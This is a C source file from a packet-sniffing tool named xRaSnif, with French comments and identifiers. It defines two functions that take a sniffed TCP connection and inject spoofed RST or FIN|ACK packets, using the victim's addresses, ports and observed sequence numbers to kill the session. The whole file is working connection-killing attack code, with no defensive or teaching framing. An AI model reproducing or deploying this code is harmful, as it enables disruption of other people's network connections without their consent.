/* xRaSnif by RaPass <rapass@gmx.net> */

#include "xRaSnif.h"


gboolean killeRST() {

  struct iphdr *ip;
  struct tcphdr *tcp, *tcp2;
  int i;


  ip =(struct iphdr *)(connections[ligne_select] + SIZE_WID + ENTETE_ETH);
  tcp =(struct tcphdr *)(connections[ligne_select] + SIZE_WID + 
			 ENTETE_ETH + ENTETE_IP);


  fprintf(stderr, "\033[1;32mAppelle du KilLeR dE ConNecTIonS RST sur la %d\033[0m\n", 
	  ligne_select);
  pthread_mutex_lock(&my_mutex);
  if ((i = cherche_connection(ip, tcp, NbrLignes, 1)) < 0) {
    fprintf(stderr, "\033[1;31mImpossible de killer cette connection :(\033[0m\n");
    pthread_mutex_unlock(&my_mutex);
    return TRUE;
  }


  tcp2 =(struct tcphdr *)(connections[i] + SIZE_WID +
			  ENTETE_ETH + ENTETE_IP);

  envoie_tcp(ip->saddr, ip->daddr,
	     ntohs(tcp->source), ntohs(tcp->dest), 
	     TH_RST, ntohl(tcp2->ack_seq), 0, 512, 
	     NULL, 0);
  
  pthread_mutex_unlock(&my_mutex);
  return TRUE;
}

gboolean killeFIN() {

  struct iphdr *ip, *ip2;
  struct tcphdr *tcp, *tcp2;
  int i;
  long seq;

  ip =(struct iphdr *)(connections[ligne_select] + SIZE_WID + ENTETE_ETH);
  tcp =(struct tcphdr *)(connections[ligne_select] + SIZE_WID + 
			 ENTETE_ETH + ENTETE_IP);
  
  fprintf(stderr, "\033[1;32mAppelle du Killer dE ConNecTIonS FIN sur la %d\033[0m\n", 
	  ligne_select);
  pthread_mutex_lock(&my_mutex);
  if ((i = cherche_connection(ip, tcp, NbrLignes, 1)) < 0) {
    fprintf(stderr, "\033[1;31mImpossible de killer cette connection :(\033[0m\n");
    pthread_mutex_unlock(&my_mutex);
    return TRUE;
  }

  ip2 =(struct iphdr *)(connections[i] + SIZE_WID + ENTETE_ETH);
  tcp2 =(struct tcphdr *)(connections[i] + SIZE_WID +
			  ENTETE_ETH + ENTETE_IP);
  
  seq = ntohl(tcp2->seq) + ntohs(ip2->tot_len) - ENTETE_IP - (tcp2->doff*4);

  envoie_tcp(ip->saddr, ip->daddr,
	     ntohs(tcp->source), ntohs(tcp->dest), TH_ACK | TH_FIN,
	     ntohl(tcp2->ack_seq), seq, 512, 
	     NULL, 0);
  
  pthread_mutex_unlock(&my_mutex);
  return TRUE;
}
  
